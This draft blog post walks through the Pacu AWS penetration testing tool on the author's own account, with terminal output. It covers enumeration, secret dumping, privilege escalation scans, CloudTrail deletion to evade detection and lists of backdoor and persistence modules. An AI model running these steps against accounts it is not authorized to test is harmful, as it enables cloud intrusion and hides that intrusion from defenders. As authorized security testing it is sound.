---
title: Testing AWS Infra with PACU
date: 2024-10-26
tags: ["cloud"]
draft: true
image: aws_pacu.png
layout: blog-post
---

![image](aws_pacu.png)

## Pacu

Pacu is an open-source cloud penetration testing framework specifically designed for assessing the security of AWS environments. Created by Rhino Security Labs, it offers a  range of modules that simulate real-world attacks, focusing on identifying misconfigurations, excessive permissions, and other vulnerabilities in AWS configurations. Pacu’s modular structure makes it easy to run targeted security tests, from basic reconnaissance and privilege escalation to advanced lateral movement within the AWS infrastructure.

## Running Module List
Pacu organizes its functionality into various modules, each designed to test specific AWS services or configurations. To see the full list of modules available to use we run the following command:

```bash
Pacu (pacu-test:None) > list
```
### Reducing the Region Scope

I will be setting Pacu to operate within a single region, ca-central-1, where most of my AWS resources are hosted, I’m able to narrow the focus of the security assessment and reduce the number of scanning calls being made to save time. 

```bash
Pacu (pacu:None) > set_regions ca-central-1
  Session regions changed: ['ca-central-1']
```
## Reconnaissance Module List

Reconnaissance in AWS environments involves collecting data to understand the cloud infrastructure without requiring deep privileges. Pacu's Enumeration and recon modules allow testers to discover critical details about AWS resources and configurations. These modules are especially useful because they often work with minimal permissions, making them less detectable and ideal for stealthy initial information gathering.

```bash
[Category: RECON_UNAUTH]
  ebs__enum_snapshots_unauth
  iam__enum_roles
  iam__enum_users

[Category: ENUM]
  acm__enum
  apigateway__enum
  aws__enum_account
  aws__enum_spend
  cloudformation__download_data
  codebuild__enum
  cognito__enum
  dynamodb__enum
  ebs__enum_volumes_snapshots
  ec2__check_termination_protection
  ec2__download_userdata
  ec2__enum
  ecr__enum
  ecs__enum
  ecs__enum_task_def
  eks__enum
  glue__enum
  guardduty__list_accounts
  guardduty__list_findings
  iam__bruteforce_permissions
  iam__decode_accesskey_id
  iam__detect_honeytokens
  iam__enum_action_query
  iam__enum_permissions
  iam__enum_users_roles_policies_groups
  iam__get_credential_report
  inspector__get_reports
  lambda__enum
  lightsail__enum
  mq__enum
  organizations__enum
  rds__enum
  rds__enum_snapshots
  route53__enum
  secrets__enum
  sns__enum
  systemsmanager__download_parameters
  transfer_family__enum
```
### Admin User Scanning

In this exercise, we'll start with an admin user which allows us to bypass permission barriers, ensuring we can run Pacu’s enumeration and reconnaissance modules without interruptions or access issues. This establishes a baseline by having the complete layout of AWS resources, roles, and permissions to compare to. With unrestricted access, we can identify potential misconfigurations, excessive permissions, and over-privileged access patterns—common security risks in cloud environments. 

![image](user_group.png)

### IAM Enumeration

The ```iam__enum_permissions``` module in Pacu allows us to list all permissions assigned to the pacu user, providing visibility into every action the user can execute across AWS services. 

```bash
Pacu (pacu:None) > run iam__enum_permissions
  Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   pacu...
[iam__enum_permissions]     Confirmed Permissions for pacu
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

  15319 Confirmed permissions for user: pacu.
      0 Confirmed permissions for 0 role(s).
      0 Unconfirmed permissions for 0 user(s).
      0 Unconfirmed permissions for 0 role(s).
```

### Getting the data back

Pacu saves all the results it gathers into an sql database that we can query offline. This is done through the ```data``` keyword and specifying one of the following services:

```bash
APIGateway     CloudTrail      CloudWatch      
CodeBuild       Cognito         Config          DataPipeline    
DynamoDB        EC2             ECS             EKS     Glue      
GuardDuty       IAM             Inspector       Lambda  
Lightsail       MQ              S3              SecretsManager  
Shield          SNS             SSM             VPC     
WAF             Account         AccountSpend    Route53 
RDS             Transfer        Organizations
```

Below I listed out the cached IAM data that we can review for all ```users```, ```policies``` and ```Roles```.

```bash
Pacu (pacu:None) > data IAM
{
  "Groups": [
    {
      "Arn": "arn:aws:iam::025695118869:group/admin",
      "CreateDate": "Sat, 25 Jun 2022 23:20:08",
      "GroupId": "[REDACTED]",
      "GroupName": "admin",
      "Path": "/"
    },
    {
      "Arn": "arn:aws:iam::025695118869:group/developers",
      "CreateDate": "Sat, 10 Jun 2023 15:35:47",
      "GroupId": "[REDACTED]",
      "GroupName": "developers",
      "Path": "/"
    }
  ],
  "Policies": [
    {
      "Arn": "arn:aws:iam::025695118869:policy/service-role/AWSLambdaBasicExecutionRole-be717f42-01b3-49ef-b790-c3041b45e4b1",
      "AttachmentCount": 1,
      "CreateDate": "Mon, 12 Jun 2023 02:41:38",
      "DefaultVersionId": "v1",
      "IsAttachable": true,
      "Path": "/service-role/",
      "PermissionsBoundaryUsageCount": 0,
      "PolicyId": "ANPAQL64MMYK7BRUWBFMS",
      "PolicyName": "AWSLambdaBasicExecutionRole-be717f42-01b3-49ef-b790-c3041b45e4b1",
      "UpdateDate": "Mon, 12 Jun 2023 02:41:38"
    },
    .
    .
    .
```
### IAM Role Enumeration

We executed the ```iam__enum_users_roles_policies_groups``` module to gather a comprehensive list of IAM entities within the AWS environment. This gives us an overview of how many users and groups we can take advantage of on a single account. 

```bash
Pacu (pacu:None) > run iam__enum_users_roles_policies_groups
[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  2 Users Enumerated
  18 Roles Enumerated
  3 Policies Enumerated
  2 Groups Enumerated
  IAM resources saved in Pacu database.
```
### Credentials Report

We executed the ```iam__get_credential_report``` module to retrieve a credential report that compiles important security-related information for all IAM users within the AWS account. This report includes details on user account statuses, last access times, password policies, and access key usage.

```bash
Pacu (pacu:None) > run iam__get_credential_report
  Running module iam__get_credential_report...
[iam__get_credential_report] Credential report saved to downloads/get_credential_report_pacu.csv
[iam__get_credential_report] iam__get_credential_report completed.

[iam__get_credential_report] MODULE SUMMARY:

  Report was not generated
    Report saved to: downloads/get_credential_report_pacu.csv
```

Since I installed pacu as a python module, the download location will be at ```/home/ec2-user/.local/share/pacu/pacu```.

### Secret Enumeration

As the admin user has access to secret and parameter storage we are able to download all the secrets known by the admin and store them conveniently in their own folders with seperate text files:

```bash
Pacu (pacu:None) > run secrets__enum --regions ca-central-1
  Running module secrets__enum...
[secrets__enum] Starting region ca-central-1...
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
'    2 Parameter(s) were found in AWS Systems Manager Parameter Store
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```

### Resource Enumeration

We can get a high level view of all available resources, making it possible to identify which services can be exploited with other modules later on.

```bash
Pacu (pacu:None) > run ec2__enum --regions ca-central-1
  Running module ec2__enum...
[ec2__enum] MODULE SUMMARY:

  Regions:
     ca-central-1

    1 total instance(s) found.
    7 total security group(s) found.
    0 total elastic IP address(es) found.
    1 total public IP address(es) found.
    0 total VPN customer gateway(s) found.
    0 total dedicated hosts(s) found.
    1 total network ACL(s) found.
    0 total NAT gateway(s) found.
    1 total network interface(s) found.
    1 total route table(s) found.
    3 total subnets(s) found.
    1 total VPC(s) found.
    0 total VPC endpoint(s) found.
    1 total launch template(s) found.
```

### Cost Enumeration
As a bonus we get to see a filtered view of all the spending on the AWS account for the current month. As you can see my spending is very low, with the highest expense coming from hosting this site on AWS Amplify.

```bash
Pacu (pacu:None) > run aws__enum_spend
[aws__enum_spend] MODULE SUMMARY:

Account Spend:
        AmazonRoute53                 :       0.58 (USD)
        AWSAmplify                    :       0.11 (USD)
        AmazonEC2                     :       0.08 (USD)
        AWSMarketplace                :       0.00 (USD)
        AmazonSNS                     :       0.00 (USD)
        AmazonCloudWatch              :       0.00 (USD)
        AmazonS3                      :       0.00 (USD)
```

## Exploit Module List
Moving on from plain enumeration we can execute a number of exploit modules that will make use of the services that we discovered in our enumeration stage

```bash
[Category: ESCALATE]
  cfn__resource_injection
  iam__privesc_scan

[Category: EVADE]
  cloudtrail__download_event_history
  cloudwatch__download_logs
  detection__disruption
  detection__enum_services
  elb__enum_logging
  guardduty__whitelist_ip
  waf__enum

[Category: EXFIL]
  ebs__download_snapshots
  rds__explore_snapshots
  s3__download_bucket

[Category: EXPLOIT]
  api_gateway__create_api_keys
  cognito__attack
  ebs__explore_snapshots
  ec2__startup_shell_script
  ecs__backdoor_task_def
  lightsail__download_ssh_keys
  lightsail__generate_ssh_keys
  lightsail__generate_temp_access
  systemsmanager__rce_ec2
```

### IAM Privilege Escalation

Because we are running this test on an admin server we are able to execute on all levels of privilege escalation, continuing with our goal to benchmark the highest level of the available permisions. Because the admin user has access to the ```AddUserToGroup``` policy we see that we can simply add ourselves to any group and we can pick from the list of available groups, or input one manually. 

```bash
Pacu (pacu:None) > run iam__privesc_scan
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: AddUserToGroup
[iam__privesc_scan]   CONFIRMED: AttachGroupPolicy
[iam__privesc_scan]   CONFIRMED: AttachRolePolicy
[iam__privesc_scan]   CONFIRMED: AttachUserPolicy
[iam__privesc_scan]   CONFIRMED: CodeStarCreateProjectThenAssociateTeamMember
[iam__privesc_scan]   CONFIRMED: CreateAccessKey
[iam__privesc_scan]   CONFIRMED: CreateEC2WithExistingIP
[iam__privesc_scan]   CONFIRMED: CreateLoginProfile
[iam__privesc_scan]   CONFIRMED: CreateNewPolicyVersion
[iam__privesc_scan]   CONFIRMED: EditExistingLambdaFunctionWithRole
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewCloudFormation
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewCodeStarProject
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewDataPipeline
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewGlueDevEndpoint
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewLambdaThenInvoke
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewLambdaThenTriggerWithNewDynamo
[iam__privesc_scan]   CONFIRMED: PutGroupPolicy
[iam__privesc_scan]   CONFIRMED: PutRolePolicy
[iam__privesc_scan]   CONFIRMED: PutUserPolicy
[iam__privesc_scan]   CONFIRMED: SetExistingDefaultPolicyVersion
[iam__privesc_scan]   CONFIRMED: UpdateExistingGlueDevEndpoint
[iam__privesc_scan]   CONFIRMED: UpdateLoginProfile
[iam__privesc_scan]   CONFIRMED: UpdateRolePolicyToAssumeIt
[iam__privesc_scan] Attempting confirmed privilege escalation methods...

[iam__privesc_scan]   Starting method AddUserToGroup...

[iam__privesc_scan]     Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list of possible groups to choose from:
[iam__privesc_scan] Found 2 group(s). Choose a group below.
[iam__privesc_scan]   [0] Other (Manually enter group name)
[iam__privesc_scan]   [1] admin
[iam__privesc_scan]   [2] developers
[iam__privesc_scan] Choose an option:
```

### Detection Evasion

To make sure we're not tripping up too many alarms we can do a scan of the detection capabilities of the AWS account. We can see here that I don't have too many protections in place because GuardDuty pricing is unpredictable, but I do have cloudtrail logs set up and we can even download them with a seperate module. 

```bash
Pacu (pacu:None) > run detection__enum_services
[detection__enum_services] MODULE SUMMARY:

  Shield Subscription Status: Inactive
  1 CloudTrail Trail(s) found.
  0 GuardDuty Detector(s) found.
  0 Master GuardDuty Detector(s) found.
  AWS Config Data:
    0 Rule(s) found.
    0 Recorder(s) found.
    0 Delivery Channel(s) found.
    0 Aggregator(s) found.
  0 CloudWatch Alarm(s) found.
  0 VPC flow log(s) found.
```

### Detection Destruction

We can also go as far as deleting all active detections in aws with a single module execution, showing below how I was able to select the one cloudtrail I had going and deleting it. 

```bash
Pacu (pacu:None) > run detection__disruption
  Running module detection__disruption...
[detection__disruption] No detectors found. Skipping GuardDuty...

[detection__disruption] Starting CloudTrail...
[detection__disruption]   Starting region ca-central-1...

[detection__disruption]     CloudTrail trail name: management-events
        Do you want to disable (dis), delete (del), minimize (m), or skip (s) it? (dis/del/m/s) del
[detection__disruption]         Successfully deleted trail management-events!

[detection__disruption] CloudTrail finished.
[detection__disruption] No rules found. Skipping Config rules...
[detection__disruption] No recorders found. Skipping Config recorders...
[detection__disruption] No aggregators found. Skipping Config aggregators...
[detection__disruption] No alarms found. Skipping CloudWatch...
[detection__disruption] No flow logs found. Skipping VPC...
[detection__disruption] detection__disruption completed.

[detection__disruption] MODULE SUMMARY:

  CloudTrail:
    0 trail(s) disabled.
    1 trail(s) deleted.
    0 trail(s) minimized.
```

The only issue with simply deleting the detections is that the acual logs are stored in S3 and are not affected by the detection service deletion. This procedue is then natuarally going to happen at the begining of the exploitation attempt rather than at the end. A likely module that would be devised in addition to these would invlove deleting these logs as well.

![image](aws_pacu_[cloud_logs].png)

### Creating Additional Resources
We can also create new keys for ourselves to access resources like the API Gateway with additional resources using the the ```api_gateway__create_api_keys``` module:

```bash
Pacu (pacu:None) > run api_gateway__create_api_keys
  Running module api_gateway__create_api_keys...
[api_gateway__create_api_keys] Starting region ca-central-1...
[api_gateway__create_api_keys]   Key creation successful
[api_gateway__create_api_keys] api_gateway__create_api_keys completed.

[api_gateway__create_api_keys] MODULE SUMMARY:

  1 key(s) created.
  Keys saved in Pacu database.
```
## Persist Module List

The Persist category modules are designed to test the ability to establish long-term access within an AWS environment by creating backdoors in various services. For example, modules like ```ec2__backdoor_ec2_sec_groups``` can insert malicious entries into EC2 security groups, while ```iam__backdoor_assume_role```, ```iam__backdoor_users_keys```, and ```iam__backdoor_users_password``` allow us to inject access keys, passwords, or assume-role permissions. Similarly, modules like ```lambda__backdoor_new_roles``` and ```lambda__backdoor_new_sec_groups``` target AWS Lambda functions to manipulate roles and security groups, effectively granting unauthorized but persistent access.

```bash
[Category: PERSIST]
  ec2__backdoor_ec2_sec_groups
  iam__backdoor_assume_role
  iam__backdoor_users_keys
  iam__backdoor_users_password
  lambda__backdoor_new_roles
  lambda__backdoor_new_sec_groups
  lambda__backdoor_new_users

[Category: LATERAL_MOVE]
  cloudtrail__csv_injection
  organizations__assume_role
  sns__subscribe
  vpc__enum_lateral_movement
```